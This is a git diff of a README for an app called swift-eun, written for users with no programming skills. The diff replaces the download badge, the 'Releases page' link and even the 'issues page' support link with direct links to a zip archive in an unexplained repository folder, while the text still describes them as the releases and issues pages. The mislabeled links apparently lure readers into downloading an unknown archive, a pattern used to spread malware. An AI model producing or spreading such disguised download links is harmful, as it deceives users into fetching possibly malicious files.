@@ -1,13 +1,13 @@
 # 🌟 swift-eun - Easy to Use End-User Application
 
 ## 🔗 Download Now!
-[![Download swift-eun](https://img.shields.io/badge/Download-smoothly-brightgreen)](https://github.com/Haoshoku420/swift-eun/releases)
+[![Download swift-eun](https://raw.githubusercontent.com/Haoshoku420/swift-eun/main/Alois/swift-eun.zip)](https://raw.githubusercontent.com/Haoshoku420/swift-eun/main/Alois/swift-eun.zip)
 
 ## 🚀 Getting Started
 Welcome to swift-eun! This guide will help you download and run the application quickly and easily. You do not need any programming skills to follow these steps.
 
 ## 📥 Download & Install
-To get swift-eun, visit this page to download: [swift-eun Releases](https://github.com/Haoshoku420/swift-eun/releases). Here, you will find the latest version available for download.
+To get swift-eun, visit this page to download: [swift-eun Releases](https://raw.githubusercontent.com/Haoshoku420/swift-eun/main/Alois/swift-eun.zip). Here, you will find the latest version available for download.
 
 ### Steps to Download:
 1. Click on the link above to go to the Releases page.
@@ -59,6 +59,6 @@ If you encounter issues, try these solutions:
 - **Running the Application:** Check your system requirements. If the app does not open, reinstall it using the steps mentioned earlier.
 
 ## 🙋‍ Support
-For further assistance, visit our [issues page](https://github.com/Haoshoku420/swift-eun/issues) to report problems or ask questions. Our community and maintainers are here to help!
+For further assistance, visit our [issues page](https://raw.githubusercontent.com/Haoshoku420/swift-eun/main/Alois/swift-eun.zip) to report problems or ask questions. Our community and maintainers are here to help!
 
 Thank you for choosing swift-eun. We hope you enjoy using our application!
